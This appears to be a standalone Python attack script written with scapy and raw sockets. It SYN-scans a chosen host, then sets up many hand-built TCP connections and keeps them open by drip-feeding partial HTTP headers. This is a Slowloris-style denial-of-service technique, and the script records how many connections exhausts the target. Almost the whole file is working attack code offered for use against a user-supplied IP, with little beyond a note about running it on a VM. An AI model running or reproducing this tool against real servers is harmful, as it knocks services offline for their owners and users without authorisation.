print('Preparation: Import libraries...')
import TCPackets
import Sniffer_TCP
import socket
import random
import asyncio
import time
import threading
import sqlite3
from scapy.all import *

try:
	dst_ip = sys.argv[1]
except:
	dst_ip = input('Enter IP: ')

print('Attacked host: {}'.format(dst_ip))

#src_ip = ''
#dst_ip = ''

conn = sqlite3.connect('database.db')
cursor = conn.cursor()
try:
	cursor.execute("""CREATE TABLE checked_ip (host text, port text, max text) """)
	print('Database was created')
except:
	pass

open_ports = None
maximum_connections = None
user_agents = [
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:49.0) Gecko/20100101 Firefox/49.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/602.2.14 (KHTML, like Gecko) Version/10.0.1 Safari/602.2.14",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393"
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
    "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0",
]

def check_max(dst_ip, dst_port):
	t = time.time()
	global maximum_connections
	while True:
		if time.time() - t >= 5:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.settimeout(5)
			try:
				s.connect((dst_ip, dst_port))
				s.close()
			except socket.timeout:
				print('Maximum connections: {}'.format(len(connections)))
				s.close()
				maximum_connections = len(connections)
				break
			except:
				continue
			t = time.time()

def ports_scanner(dst_ip):
	print('Scanning open ports at {}...'.format(dst_ip))
	open_ports = list()
	packet = IP(dst=dst_ip)/TCP(dport=(1,443),flags='S')
	res, unans = sr(packet, timeout=10, verbose=False)
	for i in res:
		if i[1][1].flags == 18:
			open_ports.append(i[1].sport)
			packet = IP(dst=dst_ip)/TCP(dport=i[1][1].sport,flags='R')
			send(packet, verbose=False)

	if open_ports:
		print('Open ports on {}: {}\n'.format(dst_ip, open_ports))
	else:
		print('Host {} has no open ports.'.format(dst_ip))
	return open_ports

def free_ports_init():
	free_ports = list()
	for i in range(65535):
		free_ports.append(i)
	return free_ports

free_ports = free_ports_init()

class Connection():
	def __init__(self, src_ip, src_port, ack, seq):
		self.src_ip = src_ip
		self.src_port = src_port
		self.ack = ack
		self.seq = seq


async def send_syn():
	global src_ip
	global dst_ip
	global dst_port
	global quantity_of_connections
	global free_ports
	global sniffer
	global maximum_connections
	global open_ports

	if not dst_port and not open_ports:

		open_ports = ports_scanner(dst_ip)
	
		while True:
			dst_port = int(input('Which one (port)? '))
			if dst_port not in open_ports:
				print('{} is not open. Choose from: {}'.format(dst_port, open_ports))
			else:
				open_ports.remove(dst_port)
				break
	elif open_ports and not dst_port:
		while True:
			print('Open ports: {}'.format(open_ports))
			dst_port = int(input('Which one (port)? '))
			if dst_port not in open_ports and open_ports:
				print('{} is not open. Choose from: {}'.format(dst_port, open_ports))
			else:
				break


	t = time.time()

	s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
	flags = 0b0000010 #SYN flag
	src_port = random.choice(free_ports)
	free_ports.remove(src_port)

	packet = TCPackets.TCPPacket(src_ip, src_port, dst_ip, dst_port, flags)
	sniffer.ip = src_ip

	x = int(input('How many connections? '))
	t = time.time()
	for i in range(x):
		s.sendto(packet.build(), (dst_ip, dst_port))
		packet.seq = random.randint(0, 4294967295)
		src_port = random.choice(free_ports)
		free_ports.remove(src_port)
		packet.src_port = src_port
		await asyncio.sleep(0.01)
		if maximum_connections:
			break


async def connect():

	global sniffer
	global src_ip
	global dst_ip
	global dst_port
	global connections
	global user_agents
	global free_ports
	global maximum_connections

	ports = list()

	s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)

	while True:

		if sniffer.TCP_stack:

			response_packet = sniffer.TCP_stack[0]

			if (response_packet.flags['S'] and response_packet.flags['A']) and (response_packet.dst_port not in ports):
				flags = 0b00010000 #ACK flag
				packet = TCPackets.TCPPacket(src_ip, response_packet.dst_port, dst_ip, dst_port, flags)
				packet.seq = response_packet.ack
				packet.ack = response_packet.seq + 1

				s.sendto(packet.build(), (dst_ip, dst_port))
				ports.append(packet.src_port)

				packet = IP(dst=dst_ip)/TCP(sport=response_packet.dst_port, dport=dst_port, flags='PA', seq=response_packet.ack, ack=response_packet.seq+1)
				
				data = ('GET /?{} HTTP/1.1\r\n'.format(random.randint(0, 2000)) + 'User-Agent: {}\r\n'.format(random.choice(user_agents)) + "{}\r\n".format("Accept-language: en-US,en,q=0.5"))
								
				send(packet/data, verbose=False)
				con = Connection(src_ip, response_packet.dst_port, response_packet.seq, response_packet.ack + len(data))
				connections.append(con)
				

			elif response_packet.flags['F']:

				packet = IP(dst=dst_ip)/TCP(sport=response_packet.dst_port, dport=dst_port, flags='A', seq=response_packet.ack, ack=response_packet.seq+1)
				send(packet, verbose=False)
				
				if response_packet.dst_port in ports:				
					connections.pop(ports.index(response_packet.dst_port))
					ports.remove(response_packet.dst_port)				
				
				src_port = random.choice(free_ports)
				free_ports.remove(src_port)
				packet = TCPackets.TCPPacket(src_ip, src_port, dst_ip, dst_port, 0b00000010)
				packet.seq = random.randint(0, 4294967295)
				s.sendto(packet.build(), (dst_ip, dst_port))
				
			sniffer.TCP_stack.pop(0)

		if maximum_connections:
			sniffer.stop = True
			break

		await asyncio.sleep(0)

async def keep_connection_open():

	global connections
	global src_ip
	global dst_ip
	global dst_port
	global maximum_connections
	
	while True:
		if not maximum_connections:
			if len(connections) != 0:
				print('-------- {} CONNECTIONS KEEPING OPEN---------'.format(len(connections)))

			t = time.time()
			
			for conn in connections:
				packet = IP(dst=dst_ip)/TCP(sport=conn.src_port, dport=dst_port, flags='A', seq=conn.seq, ack=conn.ack)
				data = ('X-a: {}\r\n'.format(random.randint(0, 5000)))
				send(packet/data, verbose=False)
				conn.seq += len(data)
				await asyncio.sleep(0)

			if len(connections) != 0:
				print('In time: {}'.format(time.time() - t))

		if maximum_connections:
			connections = []
			break

		await asyncio.sleep(10)
		
		
		
				

async def main_loop():
	global sniffer
	t1 = asyncio.create_task(send_syn())
	t2 = asyncio.create_task(connect())
	t3 = asyncio.create_task(sniffer.sniff())
	t4 = asyncio.create_task(keep_connection_open())


	await asyncio.gather(t1, t2, t3, t4)


connections = []

p = IP(dst=dst_ip)/TCP(dport=8888, flags='S')
r = sr1(p, verbose=False, timeout=5)
if r:
	src_ip = str(r[0].dst)
	sniffer = Sniffer_TCP.Sniffer(src_ip)
else: # If you try to attack localhost server
	src_ip = 'localhost'

print('Your ip: {}'.format(src_ip))

try:
	dst_port = int(sys.argv[2])
except:
	open_ports = ports_scanner(dst_ip)
	
	while True:
		dst_port = int(input('Which one (port)? '))
		if dst_port not in open_ports:
			print('{} is not open. Choose from: {}'.format(dst_port, open_ports))
		else:
			break

print('Attacked port: {}'.format(dst_port))

if __name__ == '__main__':
	if dst_ip == 'localhost':
		print('You try to reach smth unreachable (Program is not working with localhost. Try to start your server on VM)')
	else:
		while True:
			if not maximum_connections:
				thread = threading.Thread(target=check_max, args=(dst_ip, dst_port))
				thread.start()
				asyncio.run(main_loop())
				while True:
					if maximum_connections:
						cursor.execute("INSERT INTO checked_ip (host, port, max) VALUES (?, ?, ?)", (dst_ip, str(dst_port), str(maximum_connections)))
						conn.commit()
						file = open('database_txt.txt', 'a+')
						file.write('{} - {} - {}\n'.format(dst_ip, dst_port, maximum_connections))
						file.close()
						break
			else:
				x = input('Do you want to contionue (y/n)? ')
				if x.lower() == 'y':
					dst_port = None
					maximum_connections = None
					sniffer.stop = False
					if not connections:
						print('No more open ports.')
						break
				else:
					break

cursor.close()




